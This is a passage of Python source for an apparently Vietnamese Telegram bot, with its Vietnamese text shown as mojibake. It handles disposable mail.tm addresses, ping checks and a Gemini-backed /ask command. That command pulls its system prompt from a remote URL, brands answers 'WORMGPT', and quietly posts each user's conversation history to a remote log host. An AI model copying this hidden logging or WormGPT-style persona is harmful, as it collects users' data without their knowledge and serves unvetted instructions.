        return send_message_robustly(message.chat.id, text="üö´ B·∫°n kh√¥ng c√≥ quy·ªÅn s·ª≠ d·ª•ng l·ªánh n√†y.", parse_mode="HTML", reply_to_message_id=message.message_id)
    
    with user_group_info_lock: # ƒê·ªçc bi·∫øn ƒë∆∞·ª£c b·∫£o v·ªá
        if not GROUP_INFOS:
            return send_message_robustly(message.chat.id, text="üì≠ Hi·ªán t·∫°i bot ch∆∞a c√≥ th√¥ng tin v·ªÅ nh√≥m n√†o.", parse_mode="HTML", reply_to_message_id=message.message_id)
        
        text = "<b>üì¶ Sever:</b>\n\n"
        for g in GROUP_INFOS:
            title = g.get("title", "Kh√¥ng r√µ t√™n nh√≥m")
            link = f"https://t.me/{g.get('username')}" if g.get("username") else "‚õî Kh√¥ng c√≥ link m·ªùi"
            text += f"üìå <b>{title}</b>\n{link}\n\n"
    
    send_message_robustly(message.chat.id, text=text, parse_mode="HTML", disable_web_page_preview=True, reply_to_message_id=message.message_id)


# L·ªánh t·∫°o mail 10 ph√∫t
@bot.message_handler(commands=['mail10p'])
@increment_interaction_count
def handle_mail10p(message):
    logging.info(f"Received /mail10p from user {message.from_user.id} in chat {message.chat.id}") # Th√™m log
    sync_chat_to_server(message.chat)
    user_id = message.chat.id
    
    # Ki·ªÉm tra xem ng∆∞·ªùi d√πng ƒë√£ c√≥ mail ch∆∞a v√† c√≤n th·ªùi gian kh√¥ng
    with user_data_lock: # B·∫£o v·ªá truy c·∫≠p user_data
        if user_id in user_data:
            elapsed_time = int(time.time() - user_data[user_id]["created_at"])
            remaining_time = 600 - elapsed_time
            if remaining_time > 0:
                minutes = remaining_time // 60
                seconds = remaining_time % 60
                
                # G·ª≠i l·∫°i th√¥ng tin mail k√®m n√∫t "Xem H·ªôp Th∆∞"
                mail_info_text = (
                    f"‚ö†Ô∏è B·∫°n ƒë√£ c√≥ m·ªôt mail 10 ph√∫t r·ªìi:\n"
                    f"üìß `{user_data[user_id]['email']}`\n"
                    f"‚è∞ Mail n√†y s·∫Ω h·∫øt h·∫°n sau {minutes} ph√∫t {seconds} gi√¢y."
                )
                markup = build_mail_buttons(user_id, 'mail_info')
                
                sent_msg = send_message_robustly(message.chat.id, 
                                                text=mail_info_text,
                                                parse_mode='Markdown',
                                                reply_markup=markup,
                                                reply_to_message_id=message.message_id)
                with mail_messages_state_lock: # B·∫£o v·ªá truy c·∫≠p bot.mail_messages_state
                    if sent_msg:
                        bot.mail_messages_state[sent_msg.message_id] = {'chat_id': user_id, 'user_id': user_id, 'type': 'mail_info'}
                return
            else:
                # N·∫øu h·∫øt h·∫°n nh∆∞ng ch∆∞a b·ªã x√≥a, x√≥a n√≥ ƒëi
                del user_data[user_id]
                send_message_robustly(message.chat.id, "‚è∞ Mail 10 ph√∫t c·ªßa b·∫°n ƒë√£ h·∫øt h·∫°n, ƒëang t·∫°o mail m·ªõi...", parse_mode='Markdown', reply_to_message_id=message.message_id)


    email, pwd, token = create_temp_mail()

    if email:
        with user_data_lock: # B·∫£o v·ªá truy c·∫≠p user_data
            user_data[user_id] = {
                "email": email,
                "password": pwd,
                "token": token,
                "created_at": time.time()
            }
        
        mail_info_text = (
            f"‚úÖ Mail 10 ph√∫t c·ªßa b·∫°n l√†:\n"
            f"üìß `{email}`\n"
            f"‚è∞ H·∫øt h·∫°n sau 10 ph√∫t."
        )
        markup = build_mail_buttons(user_id, 'mail_info')
        
        sent_msg = send_message_robustly(message.chat.id, 
                                       text=mail_info_text, 
                                       parse_mode='Markdown',
                                       reply_markup=markup,
                                       reply_to_message_id=message.message_id)
        # L∆∞u tr·ªØ ID tin nh·∫Øn ƒë·ªÉ c√≥ th·ªÉ ch·ªânh s·ª≠a sau n√†y
        with mail_messages_state_lock: # B·∫£o v·ªá truy c·∫≠p bot.mail_messages_state
            if sent_msg:
                bot.mail_messages_state[sent_msg.message_id] = {'chat_id': user_id, 'user_id': user_id, 'type': 'mail_info'}
        
        threading.Thread(target=auto_delete_email, args=(user_id,)).start()
    else:
        send_message_robustly(message.chat.id, "‚ùå Kh√¥ng th·ªÉ t·∫°o email. Vui l√≤ng th·ª≠ l·∫°i sau!", parse_mode='Markdown', reply_to_message_id=message.message_id)


# H√†m x·ª≠ l√Ω l·ªánh /ping
@bot.message_handler(commands=['ping'])
def ping_command(message):
    start_time = time.time()
    
    # G·ª≠i tin nh·∫Øn t·∫°m th·ªùi ƒë·ªÉ t√≠nh ping
    sent_message = bot.send_message(message.chat.id, "ƒêang ƒêo Ping Sever Bot...", parse_mode='HTML')
    
    end_time = time.time()
    
    # T√≠nh to√°n ping (th·ªùi gian g·ª≠i v√† nh·∫≠n tin nh·∫Øn)
    ping_ms = round((end_time - start_time) * 1000)

    # T·∫°o n·ªôi dung tin nh·∫Øn HTML
    html_message = f"""
<blockquote>
    <b>‚ö° Ping Sever Bot hi·ªán t·∫°i:</b> <i>{ping_ms}ms</i>
</blockquote>
"""
    # T·∫°o n√∫t inline
    keyboard = types.InlineKeyboardMarkup()
    refresh_button = types.InlineKeyboardButton("‚ôªÔ∏è L√†m m·ªõi Ping", callback_data='refresh_ping')
    keyboard.add(refresh_button)

    # Ch·ªânh s·ª≠a tin nh·∫Øn ban ƒë·∫ßu v·ªõi th√¥ng tin ping v√† n√∫t
    bot.edit_message_text(chat_id=message.chat.id, 
                          message_id=sent_message.message_id,
                          text=html_message, 
                          reply_markup=keyboard, 
                          parse_mode='HTML')

# H√†m x·ª≠ l√Ω khi n√∫t "L√†m m·ªõi Ping" ƒë∆∞·ª£c nh·∫•n
@bot.callback_query_handler(func=lambda call: call.data == 'refresh_ping')
def refresh_ping_callback(call):
    # B√°o hi·ªáu ƒë√£ nh·∫≠n callback
    bot.answer_callback_query(call.id) 

    start_time = time.time()
    
    # Ch·ªânh s·ª≠a tin nh·∫Øn ƒë·ªÉ hi·ªÉn th·ªã tr·∫°ng th√°i "ƒêang l√†m m·ªõi"
    # ƒê√¢y l√† m·ªôt thao t√°c I/O, th·ªùi gian th·ª±c hi·ªán c√≥ th·ªÉ ƒë∆∞·ª£c d√πng ƒë·ªÉ ∆∞·ªõc l∆∞·ª£ng ping.
    bot.edit_message_text(chat_id=call.message.chat.id, 
                          message_id=call.message.message_id,
                          text="ƒêang l√†m m·ªõi ping...", 
                          parse_mode='HTML')

    end_time = time.time()
    
    ping_ms = round((end_time - start_time) * 1000)

    html_message = f"""
<blockquote>
    <b>‚ö° Ping Sever Bot Hi·ªán T·∫°i hi·ªán t·∫°i:</b> <i>{ping_ms}ms</i>
</blockquote>
"""
    keyboard = types.InlineKeyboardMarkup()
    refresh_button = types.InlineKeyboardButton("‚ôªÔ∏è L√†m m·ªõi Ping", callback_data='refresh_ping')
    keyboard.add(refresh_button)

    # Ch·ªânh s·ª≠a l·∫°i tin nh·∫Øn v·ªõi th√¥ng tin ping m·ªõi v√† n√∫t
    bot.edit_message_text(chat_id=call.message.chat.id, 
                          message_id=call.message.message_id,
                          text=html_message, 
                          reply_markup=keyboard, 
                          parse_mode='HTML')


# L·ªánh m·ªõi ƒë·ªÉ x√≥a mail 10 ph√∫t
@bot.message_handler(commands=['xoamail10p'])
@increment_interaction_count
def handle_xoamail10p(message):
    logging.info(f"Received /xoamail10p from user {message.from_user.id} in chat {message.chat.id}") # Th√™m log
    sync_chat_to_server(message.chat)
    user_id = message.chat.id

    with user_data_lock: # B·∫£o v·ªá truy c·∫≠p user_data
        if user_id in user_data:
            # X√≥a t√†i kho·∫£n Mail.tm n·∫øu c√≥ th·ªÉ (th√™m logic g·ªçi API Mail.tm n·∫øu c√≥ account_id)
            # V√≠ d·ª•:
            # try:
            #     account_info = user_data[user_id]
            #     if 'account_id' in account_info and 'token' in account_info:
            #         headers = {"Authorization": f"Bearer {account_info['token']}"}
            #         session.delete(f"https://api.mail.tm/accounts/{account_info['account_id']}", headers=headers)
            #         logging.info(f"ƒê√£ x√≥a t√†i kho·∫£n Mail.tm: {account_info['email']}")
            # except Exception as e:
            #     logging.error(f"L·ªói khi x√≥a t√†i kho·∫£n Mail.tm cho user {user_id}: {e}")

            del user_data[user_id]
            send_message_robustly(message.chat.id, "<i>üóëÔ∏è Mail 10 ph√∫t c·ªßa b·∫°n ƒë√£ ƒë∆∞·ª£c x√≥a th√†nh c√¥ng!</i>", parse_mode='HTML', reply_to_message_id=message.message_id)
        else:
            send_message_robustly(message.chat.id, "<i>‚ö†Ô∏è B·∫°n kh√¥ng c√≥ mail 10 ph√∫t n√†o ƒëang ho·∫°t ƒë·ªông ƒë·ªÉ x√≥a.<i>", parse_mode='HTML', reply_to_message_id=message.message_id)


# H√†m n·ªôi b·ªô ƒë·ªÉ l·∫•y n·ªôi dung h·ªôp th∆∞ v√† t·∫°o markup
def _get_inbox_content(user_id):
    with user_data_lock: # B·∫£o v·ªá truy c·∫≠p user_data
        info = user_data.get(user_id)

    if not info:
        return "<i>‚ùå B·∫°n ch∆∞a t·∫°o email. G√µ /mail10p ƒë·ªÉ t·∫°o nh√©!</i>", None, 'HTML'

    # Ki·ªÉm tra xem mail ƒë√£ h·∫øt h·∫°n ch∆∞a
    elapsed_time = int(time.time() - info["created_at"])
    if elapsed_time >= 600: # 10 ph√∫t
        # L·∫•y th√¥ng tin email tr∆∞·ªõc khi x√≥a
        expired_mail_address = info.get('email', 'kh√¥ng x√°c ƒë·ªãnh') # D√πng 'email' thay v√¨ 'address'

        with user_data_lock: # B·∫£o v·ªá truy c·∫≠p user_data khi x√≥a
            del user_data[user_id]
        
        reply_text = (
            f"‚è∞ <b>Mail <code>{expired_mail_address}</code> c·ªßa b·∫°n ƒë√£ h·∫øt h·∫°n!</b> "
            f"<blockquote>T·∫•t c·∫£ th∆∞ c·ªßa mail n√†y s·∫Ω b·ªã x√≥a.</blockquote> "
            f"Vui l√≤ng t·∫°o mail m·ªõi b·∫±ng l·ªánh /mail10p."
        )
        return reply_text, None, 'HTML'

    headers = {
        "Authorization": f"Bearer {info['token']}"
    }

    try:
        r = session.get("https://api.mail.tm/messages", headers=headers)
        r.raise_for_status() # Ki·ªÉm tra l·ªói HTTP
        messages = r.json().get("hydra:member", [])
        
        reply_text = ""
        if not messages:
            reply_text = "üì≠ H·ªôp th∆∞ c·ªßa b·∫°n hi·ªán ƒëang tr·ªëng."
        else:
            reply_text = f"üì• C√≥ {len(messages)} th∆∞ trong h·ªôp th∆∞:\n"
            for msg in messages:
                sender = msg['from']['address']
                subject = msg['subject']
                preview = msg['intro']
                
                sender_esc = html_escape(sender)
                subject_esc = html_escape(subject)
                preview_esc = html_escape(preview)

                reply_text += f"\nüë§ <b>T·ª´:</b> <code>{sender_esc}</code>\n" \
                              f"‚úâÔ∏è <b>Ch·ªß ƒë·ªÅ:</b> {subject_esc}\n" \
                              f"üìù <b>N·ªôi dung:</b> {preview_esc}\n"
        
        markup = build_mail_buttons(user_id, 'inbox')
        return reply_text, markup, 'HTML'

    except Exception as e:
        logging.error(f"L·ªói khi ki·ªÉm tra h·ªôp th∆∞ Mail.tm cho user {user_id}: {e}")
        return "‚ùå L·ªói khi ki·ªÉm tra h·ªôp th∆∞. Vui l√≤ng th·ª≠ l·∫°i sau.", None, 'Markdown'


# L·ªánh ki·ªÉm tra h·ªôp th∆∞ (v·∫´n gi·ªØ ƒë·ªÉ d√πng l·ªánh /hopthu)
@bot.message_handler(commands=['hopthu'])
@increment_interaction_count
def handle_hopthu(message):
    logging.info(f"Received /hopthu from user {message.from_user.id} in chat {message.chat.id}") # Th√™m log
    sync_chat_to_server(message.chat)
    user_id = message.chat.id
    
    text, markup, parse_mode = _get_inbox_content(user_id)
    sent_msg = send_message_robustly(message.chat.id, 
                                   text=text, 
                                   parse_mode=parse_mode, 
                                   reply_markup=markup,
                                   reply_to_message_id=message.message_id)
    with mail_messages_state_lock: # B·∫£o v·ªá truy c·∫≠p bot.mail_messages_state
        if sent_msg:
            # N·∫øu g·ª≠i tin nh·∫Øn m·ªõi, l∆∞u tr·∫°ng th√°i l√† inbox
            bot.mail_messages_state[sent_msg.message_id] = {'chat_id': user_id, 'user_id': user_id, 'type': 'inbox'}


# H√†m m·ªõi ƒë·ªÉ ƒë·ªãnh d·∫°ng ƒë·∫ßu ra AI
def format_ai_response_html(text):
    """
    Ph√¢n t√≠ch vƒÉn b·∫£n t·ª´ AI, t√°ch code block v√† vƒÉn b·∫£n th√¥ng th∆∞·ªùng,
    sau ƒë√≥ ƒë·ªãnh d·∫°ng ch√∫ng v·ªõi HTML cho Telegram, ƒë·∫∑c bi·ªát l√† th·∫ª <code>.
    Tr·∫£ v·ªÅ danh s√°ch c√°c ph·∫ßn (text ho·∫∑c code) ƒë·ªÉ x·ª≠ l√Ω.
    """
    parts = []
    # Regex ƒë·ªÉ t√¨m ki·∫øm c√°c block code Markdown (```language\ncode\n```)
    code_blocks = re.split(r"```(?:\w+)?\n(.*?)```", text, flags=re.DOTALL)

    for i, part in enumerate(code_blocks):
        if i % 2 == 0:  # Ph·∫ßn vƒÉn b·∫£n (ho·∫∑c ph·∫ßn tr∆∞·ªõc code ƒë·∫ßu ti√™n, ho·∫∑c sau code cu·ªëi c√πng)
            if part:
                parts.append({"type": "text", "content": html_escape(part.strip()), "raw_content": part.strip()})
        else:  # Ph·∫ßn code (l√† n·ªôi dung c·ªßa group 1 t·ª´ regex)
            if part:
                formatted_code = f"<code>{html_escape(part.strip())}</code>"
                parts.append({"type": "code", "content": formatted_code, "raw_content": part.strip()})
    return parts


@bot.callback_query_handler(func=lambda call: call.data.startswith("copycode|"))
def copy_code_button(call):
    """X·ª≠ l√Ω n√∫t 'Copy Code'."""
    try:
        _, code_id = call.data.split("|", 1)
        with code_snippets_lock: # B·∫£o v·ªá truy c·∫≠p bot.code_snippets
            code_content = bot.code_snippets.get(code_id)

        if code_content:
            bot.answer_callback_query(call.id, text="ƒê√£ sao ch√©p n·ªôi dung code!", show_alert=True)
            try:
                bot.send_message(
                    chat_id=call.message.chat.id,
                    text=f"```\n{code_content}\n```",
                    parse_mode="MarkdownV2",
                    reply_to_message_id=call.message.message_id
                )
            except telebot.apihelper.ApiTelegramException as e:
                logging.warning(f"Failed to send code snippet for copy to chat {call.message.chat.id}: {e}. Sending plain text.")
                bot.send_message(
                    chat_id=call.message.chat.id,
                    text=f"B·∫°n c√≥ th·ªÉ sao ch√©p ƒëo·∫°n code n√†y:\n\n{code_content}",
                    reply_to_message_id=call.message.message_id
                )
        else:
            bot.answer_callback_query(call.id, text="L·ªói: Kh√¥ng t√¨m th·∫•y n·ªôi dung code n√†y.", show_alert=True)
    except Exception as e:
        logging.error(f"L·ªói khi x·ª≠ l√Ω n√∫t copy code: {e}")
        bot.answer_callback_query(call.id, text="ƒê√£ x·∫£y ra l·ªói khi sao ch√©p code.", show_alert=True)


@bot.message_handler(commands=["ask"])
@increment_interaction_count
def ask_command(message):
    """X·ª≠ l√Ω l·ªánh /ask ƒë·ªÉ g·ª≠i c√¢u h·ªèi ƒë·∫øn Gemini AI. H·ªó tr·ª£ h·ªèi k√®m ·∫£nh."""
    logging.info(f"Received /ask from user {message.from_user.id} in chat {message.chat.id}") # Th√™m log
    sync_chat_to_server(message.chat)
    prompt = message.text.replace("/ask", "").strip()
    if not prompt:
        return send_message_robustly(message.chat.id, text="‚ùì B·∫°n ch∆∞a nh·∫≠p c√¢u h·ªèi r·ªìi ƒë√≥! Vui l√≤ng g√µ <code>/ask &lt;c√¢u h·ªèi c·ªßa b·∫°n&gt;</code>.", parse_mode="HTML", reply_to_message_id=message.message_id)

    try:
        msg_status = bot.send_message(message.chat.id, "ü§ñ", reply_to_message_id=message.message_id)
    except telebot.apihelper.ApiTelegramException as e:
        logging.warning(f"Failed to send initial 'thinking' message in chat {message.chat.id}: {e}. Proceeding without reply_to.")
        msg_status = bot.send_message(message.chat.id, "ü§ñ")

    user_id = message.from_user.id
    user_name = message.from_user.first_name
    memory = load_user_memory(user_id)

    try:
        prompt_data = session.get(REMOTE_PROMPT_URL, timeout=DEFAULT_TIMEOUT_GLOBAL).json()
        system_prompt = prompt_data.get("prompt", "B·∫°n l√† AI th√¥ng minh v√† h·ªØu √≠ch.")
    except Exception as e:
        logging.error(f"L·ªói t·∫£i prompt t·ª´ xa: {e}")
        system_prompt = "B·∫°n l√† AI th√¥ng minh v√† h·ªØu √≠ch."

    history_block = ""
    if memory:
        for item in memory[-5:]:
            history_block += f"Ng∆∞·ªùi d√πng h·ªèi: {item['question']}\nAI: {item['answer']}\n"

    full_prompt = f"{system_prompt}\n\n[Ng·ªØ c·∫£nh tr∆∞·ªõc ƒë√≥ v·ªõi {user_name}]\n{history_block}\nNg∆∞·ªùi d√πng hi·ªán t·∫°i h·ªèi: {prompt}"

    headers = {"Content-Type": "application/json"}
    parts = [{"text": full_prompt}]
    image_attached = False

    if message.reply_to_message and message.reply_to_message.photo:
        try:
            photo = message.reply_to_message.photo[-1]
            file_info = bot.get_file(photo.file_id)
            downloaded_file = bot.download_file(file_info.file_path)
            image = Image.open(BytesIO(downloaded_file))
            buffer = BytesIO()
            if image.mode in ("RGBA", "P"):
                image = image.convert("RGB")
            image.save(buffer, format="JPEG")
            base64_img = base64.b64encode(buffer.getvalue()).decode()
            parts.insert(0, {
                "inline_data": {
                    "mime_type": "image/jpeg",
                    "data": base64_img
                }
            })
            image_attached = True
        except Exception as e:
            logging.error(f"L·ªói x·ª≠ l√Ω ·∫£nh ƒë√≠nh k√®m: {e}")

    data = {"contents": [{"parts": parts}]}
    try:
        res = session.post(GEMINI_URL, headers=headers, json=data, timeout=DEFAULT_TIMEOUT_GLOBAL)
        res.raise_for_status()
        result = res.json()["candidates"][0]["content"]["parts"][0]["text"]
    except Exception as e:
        try:
            bot.edit_message_text(
                f"‚ùå ƒê√£ x·∫£y ra l·ªói khi g·ªçi API Gemini:\n<pre>{html_escape(str(e))}</pre>",
                msg_status.chat.id,
                msg_status.message_id,
                parse_mode="HTML"
            )
        except telebot.apihelper.ApiTelegramException as edit_e:
            logging.warning(f"Failed to edit message {msg_status.message_id}: {edit_e}. Sending new error message.")
            send_message_robustly(message.chat.id, text=f"‚ùå ƒê√£ x·∫£y ra l·ªói khi g·ªçi API Gemini:\n<pre>{html_escape(str(e))}</pre>", parse_mode="HTML")
        return

    entry = {
        "question": prompt,
        "answer": result,
        "created": datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
        "with_image": image_attached,
        "name": message.from_user.first_name
    }
    memory.append(entry)
    save_user_memory(user_id, memory)

    try:
        session.post(
            f"{REMOTE_LOG_HOST}?uid={user_id}",
            data=json.dumps(memory, ensure_ascii=False),
            headers={"Content-Type": "application/json"},
            timeout=DEFAULT_TIMEOUT_GLOBAL
        )
    except Exception as e:
        logging.error(f"L·ªói g·ª≠i log t·ª´ xa: {e}")

    # --- X·ª≠ l√Ω ƒë·ªãnh d·∫°ng v√† g·ª≠i tin nh·∫Øn ---
    response_parts_structured = format_ai_response_html(result)
    reply_id = uuid.uuid4().hex[:6]
    
    with voice_map_lock: # B·∫£o v·ªá truy c·∫≠p bot.voice_map
        bot.voice_map[reply_id] = result # L∆∞u to√†n b·ªô k·∫øt qu·∫£ g·ªëc cho TTS

    # T√≠nh to√°n t·ªïng ƒë·ªô d√†i c·ªßa n·ªôi dung (th√¥) ƒë·ªÉ quy·∫øt ƒë·ªãnh g·ª≠i file hay g·ª≠i tin nh·∫Øn
    total_raw_length = 0
    full_content_for_file = []
    for part in response_parts_structured:
        total_raw_length += len(part["raw_content"])
        if part["type"] == "text":
            full_content_for_file.append(part["raw_content"])
        elif part["type"] == "code":
            full_content_for_file.append(f"\n```\n{part['raw_content']}\n```\n")

    # Telegram c√≥ gi·ªõi h·∫°n 4096 k√Ω t·ª± cho tin nh·∫Øn v√† 1024 cho caption ·∫£nh/document.
    # S·ª≠ d·ª•ng ng∆∞·ª°ng an to√†n th·∫•p h∆°n ƒë·ªÉ quy·∫øt ƒë·ªãnh g·ª≠i file.
    # N·∫øu c√≥ nhi·ªÅu code block ho·∫∑c vƒÉn b·∫£n r·∫•t d√†i, g·ª≠i file s·∫Ω t·ªët h∆°n.
    if total_raw_length > 1500 or any(p["type"] == "code" for p in response_parts_structured):
        filename = f"zproject_{reply_id}.txt"
        with open(filename, "w", encoding="utf-8") as f:
            f.write("".join(full_content_for_file)) # Vi·∫øt to√†n b·ªô n·ªôi dung ƒë√£ gom l·∫°i

        with open(filename, "rb") as f:
            try:
                bot.send_document(
                    message.chat.id,
                    f,
                    caption=f"üìÑ Tr·∫£ l·ªùi qu√° d√†i ho·∫∑c c√≥ code block! M√¨nh ƒë√£ ƒë√≥ng g√≥i v√†o file <code>{filename}</code> nha {html_escape(message.from_user.first_name)}!\n\n"
                            f"<i>Vui l√≤ng t·∫£i xu·ªëng ƒë·ªÉ xem to√†n b·ªô n·ªôi dung.</i>",
                    parse_mode="HTML",
                    reply_to_message_id=message.message_id
                )
            except telebot.apihelper.ApiTelegramException as e:
                logging.warning(f"Failed to send document replying to message {message.message_id}: {e}. Sending without reply_to.")
                f.seek(0)
                bot.send_document(
                    message.chat.id,
                    f,
                    caption=f"üìÑ Tr·∫£ l·ªùi qu√° d√†i ho·∫∑c c√≥ code block! M√¨nh ƒë√£ ƒë√≥ng g√≥i v√†o file <code>{filename}</code> nha {html_escape(message.from_user.first_name)}!\n\n"
                            f"<i>Vui l√≤ng t·∫£i xu·ªëng ƒë·ªÉ xem to√†n b·ªô n·ªôi dung.</i>",
                    parse_mode="HTML"
                )
        os.remove(filename)
        # X√≥a tin nh·∫Øn "ƒëang x·ª≠ l√Ω" ban ƒë·∫ßu
        try:
            bot.delete_message(msg_status.chat.id, msg_status.message_id)
        except telebot.apihelper.ApiTelegramException as e:
            logging.warning(f"Failed to delete status message {msg_status.message_id}: {e}")

    else: # G·ª≠i tin nh·∫Øn th√¥ng th∆∞·ªùng n·∫øu kh√¥ng qu√° d√†i ho·∫∑c kh√¥ng c√≥ code block ri√™ng
        main_markup = build_reply_button(user_id, prompt, reply_id)
        current_message_text = f"ü§ñ <i>ZProject [WORMGPT] tr·∫£ l·ªùi:</i>\n\n"
        
        combined_text_for_telegram = ""
        for part in response_parts_structured:
            if part["type"] == "text":
                combined_text_for_telegram += part["content"] + "\n\n" # Th√™m xu·ªëng d√≤ng gi·ªØa c√°c ƒëo·∫°n vƒÉn b·∫£n
            elif part["type"] == "code":
                # Th√™m n√∫t copy code v√†o markup ch√≠nh cho ph·∫ßn code ƒë√≥
                copy_id = uuid.uuid4().hex[:8]
                with code_snippets_lock: # B·∫£o v·ªá truy c·∫≠p bot.code_snippets
                    bot.code_snippets[copy_id] = part["raw_content"]
                
                # InlineKeyboardMarkup m·ªõi cho m·ªói code block
                code_markup = InlineKeyboardMarkup()
                code_markup.add(InlineKeyboardButton("üìÑ Sao ch√©p Code", callback_data=f"copycode|{copy_id}"))

                # G·ª≠i ph·∫ßn code block ri√™ng v·ªõi n√∫t copy c·ªßa n√≥
                try:
                    # G·ª≠i text tr∆∞·ªõc n·∫øu c√≥, r·ªìi g·ª≠i code sau
                    if combined_text_for_telegram.strip():
                        bot.edit_message_text( # C·ªë g·∫Øng edit tin nh·∫Øn status n·∫øu ch∆∞a b·ªã thay th·∫ø
                            current_message_text + combined_text_for_telegram.strip(),
                            msg_status.chat.id,
                            msg_status.message_id,
                            parse_mode="HTML"
                        )
                        msg_status = None # ƒê√£ s·ª≠ d·ª•ng tin nh·∫Øn status
                    
                    bot.send_message(
                        message.chat.id,
                        text=f"<b>Code:</b>\n{part['content']}", # ƒê√£ l√† HTML escaped
                        parse_mode="HTML",
                        reply_markup=code_markup,
                        reply_to_message_id=message.message_id # Reply v·ªÅ tin nh·∫Øn g·ªëc
                    )
                except telebot.apihelper.ApiTelegramException as e:
                    logging.warning(f"Failed to send code part in chat {message.chat.id}: {e}. Sending without reply_to.")
                    bot.send_message(
                        message.chat.id,
                        text=f"<b>Code:</b>\n{part['content']}",
                        parse_mode="HTML",
                        reply_markup=code_markup
                    )
                combined_text_for_telegram = "" # Reset sau khi g·ª≠i code
        
        # G·ª≠i ph·∫ßn vƒÉn b·∫£n cu·ªëi c√πng (n·∫øu c√≥) v√† c√°c n√∫t chung
        final_response_text = current_message_text + combined_text_for_telegram.strip()
        
        try:
            if msg_status: # N·∫øu tin nh·∫Øn status ban ƒë·∫ßu v·∫´n c√≤n
                bot.edit_message_text(
                    final_response_text,
                    msg_status.chat.id,
                    msg_status.message_id,
                    parse_mode="HTML",
                    reply_markup=main_markup
                )
            else: # N·∫øu tin nh·∫Øn status ƒë√£ ƒë∆∞·ª£c s·ª≠ d·ª•ng (v√≠ d·ª• ƒë·ªÉ g·ª≠i ph·∫ßn text tr∆∞·ªõc code)
                bot.send_message(
                    message.chat.id,
                    text=final_response_text,
                    parse_mode="HTML",
                    reply_markup=main_markup,
                    reply_to_message_id=message.message_id # Reply v·ªÅ tin nh·∫Øn g·ªëc
                )
        except telebot.apihelper.ApiTelegramException as e:
            logging.warning(f"Failed to send/edit final message in chat {message.chat.id}: {e}. Sending as new message.")
            send_message_robustly(
                message.chat.id,
                text=final_response_text,
                parse_mode="HTML",
                reply_markup=main_markup,
                reply_to_message_id=message.message_id
            )
        except Exception as e:
            logging.error(f"Error in final message sending for /ask: {e}")
            send_message_robustly(message.chat.id, text=f"‚ùå ƒê√£ x·∫£y ra l·ªói khi g·ª≠i k·∫øt qu·∫£: {e}", parse_mode="HTML", reply_to_message_id=message.message_id)


# --- N√öT CALLBACK C·ª¶A BOT ZPROJECT ---

@bot.callback_query_handler(func=lambda call: call.data.startswith("retry|"))
def retry_button(call):
    """X·ª≠ l√Ω n√∫t 'Tr·∫£ l·ªùi l·∫°i' t·ª´ c√¢u h·ªèi /ask."""
    try:
        _, uid, question = call.data.split("|", 2)
        if str(call.from_user.id) != uid:
            return bot.answer_callback_query(call.id, "üö´ B·∫°n kh√¥ng ph·∫£i ng∆∞·ªùi y√™u c·∫ßu c√¢u h·ªèi n√†y.", show_alert=True)

        # T·∫°o m·ªôt ƒë·ªëi t∆∞·ª£ng message gi·∫£ l·∫≠p ƒë·ªÉ truy·ªÅn v√†o ask_command
        msg = SimpleNamespace(
            chat=call.message.chat,
            message_id=call.message.message_id,
            text="/ask " + question,
            from_user=call.from_user,
            reply_to_message=None # Gi·∫£ ƒë·ªãnh kh√¥ng c√≥ reply_to_message khi retry
        )

        bot.answer_callback_query(call.id, "üîÅ ƒêang th·ª≠ l·∫°i c√¢u h·ªèi...")
        try:
            bot.edit_message_text("ü§ñ ƒêang x·ª≠ l√Ω l·∫°i...", call.message.chat.id, call.message.message_id)
        except telebot.apihelper.ApiTelegramException as e:
            logging.warning(f"Failed to edit message {call.message.message_id} on retry: {e}. Sending new 'thinking' message.")
            bot.send_message(call.message.chat.id, "ü§ñ ƒêang x·ª≠ l√Ω l·∫°i...", reply_to_message_id=call.message.message_id)

        # G·ªçi h√†m x·ª≠ l√Ω l·ªánh /ask (ƒë∆∞·ª£c b·ªçc b·ªüi decorator @increment_interaction_count)
        # Ch·∫°y trong m·ªôt lu·ªìng ri√™ng ƒë·ªÉ kh√¥ng ch·∫∑n callback
        Thread(target=ask_command, args=(msg,)).start()

    except Exception as e:
        bot.answer_callback_query(call.id, "‚ö†Ô∏è L·ªói khi th·ª≠ l·∫°i!", show_alert=True)
        logging.error(f"[RETRY] L·ªói: {e}")

@bot.callback_query_handler(func=lambda call: call.data.startswith("tts|"))
def tts_button(call):
    """X·ª≠ l√Ω n√∫t 'Chuy·ªÉn sang Voice' t·ª´ c√¢u tr·∫£ l·ªùi /ask."""
    try:
        parts = call.data.split("|")
        uid = parts[1]
        reply_id = parts[2]

        if str(call.from_user.id) != uid:
            return bot.answer_callback_query(call.id, "üö´ B·∫°n kh√¥ng ph·∫£i ng∆∞·ªùi y√™u c·∫ßu voice n√†y.", show_alert=True)

        with voice_map_lock: # B·∫£o v·ªá truy c·∫≠p bot.voice_map
            answer = bot.voice_map.get(reply_id)
        if not answer:
            return bot.answer_callback_query(call.id, "‚ùå Kh√¥ng t√¨m th·∫•y d·ªØ li·ªáu gi·ªçng n√≥i.", show_alert=True)

        # X√≥a c√°c ƒë·ªãnh d·∫°ng HTML v√† Markdown ƒë·ªÉ gTTS ch·ªâ nh·∫≠n vƒÉn b·∫£n thu·∫ßn
        clean_text = re.sub(r"<code>.*?</code>", "", answer, flags=re.DOTALL)
        clean_text = re.sub(r"<[^>]+>", "", clean_text)
        clean_text = re.sub(r"```.*?```", "", clean_text, flags=re.DOTALL)
        clean_text = clean_text.replace('"', '').replace("'", '')

        text_to_speak = clean_text.strip()

        if not text_to_speak or len(text_to_speak) < 5:
            return bot.answer_callback_query(call.id, "‚ùó N·ªôi dung qu√° ng·∫Øn ho·∫∑c r·ªóng ƒë·ªÉ chuy·ªÉn voice.", show_alert=True)

        filename = f"zproject_tts_{reply_id}.mp3"
        tts = gTTS(text=text_to_speak, lang="vi", slow=False)
        tts.save(filename)

        with open(filename, "rb") as f:
            try:
                bot.send_voice(call.message.chat.id, f, caption="üó£Ô∏è ƒê√¢y l√† Voice ZProject:v", reply_to_message_id=call.message.message_id)
            except telebot.apihelper.ApiTelegramException as e:
                logging.warning(f"Failed to send voice replying to message {call.message.message_id}: {e}. Sending without reply_to.")
                f.seek(0)
                bot.send_voice(call.message.chat.id, f, caption="üó£Ô∏è ƒê√¢y l√† Voice ZProject:v")
        os.remove(filename)
        bot.answer_callback_query(call.id, "üéß Voice ƒë√£ ƒë∆∞·ª£c g·ª≠i!")
    except Exception as e:
        bot.answer_callback_query(call.id, "‚ö†Ô∏è L·ªói khi t·∫°o voice.", show_alert=True)
        logging.error(f"[TTS] L·ªói: {e}")

# --- N√öT CALLBACK C·ª¶A MAIL.TM ---

